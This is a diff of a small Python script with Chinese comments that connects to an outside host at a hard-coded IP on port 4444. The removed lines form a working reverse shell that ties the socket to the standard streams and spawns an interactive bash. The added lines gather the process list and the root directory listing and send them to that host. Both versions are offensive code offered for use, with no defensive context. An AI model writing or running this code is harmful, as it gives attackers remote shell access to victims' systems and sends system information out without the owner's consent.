@@ -1,19 +1,35 @@
-import socket
 import os
-import pty
+import socket
+import subprocess
 
 REMOTE_HOST = "172.237.65.250"   # 替换为你的外网主机IP
-REMOTE_PORT = 4444        # 替换为你的外网主机端口
+REMOTE_PORT = 4444       # 替换为你的服务器端口
+
+def get_process_list():
+    # 使用ps命令获取进程列表
+    try:
+        out = subprocess.check_output(['ps', 'aux'], text=True)
+    except Exception as e:
+        out = f"Error getting process list: {e}"
+    return out
+
+def get_root_file_list():
+    # 获取根目录下的文件和目录列表
+    try:
+        files = os.listdir('/')
+        files_str = '\n'.join(files)
+    except Exception as e:
+        files_str = f"Error getting root file list: {e}"
+    return files_str
 
 def main():
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect((REMOTE_HOST, REMOTE_PORT))
-    # 将socket与标准输入/输出/错误绑定
-    os.dup2(s.fileno(), 0)
-    os.dup2(s.fileno(), 1)
-    os.dup2(s.fileno(), 2)
-    # 用pty.spawn获取完整交互式shell
-    pty.spawn("/bin/bash")
+    process_list = get_process_list()
+    root_files = get_root_file_list()
+    data = f"Process List:\n{process_list}\n\nRoot Directory Files:\n{root_files}"
+
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        s.connect((REMOTE_HOST, REMOTE_PORT))
+        s.sendall(data.encode())
 
 if __name__ == "__main__":
     main()
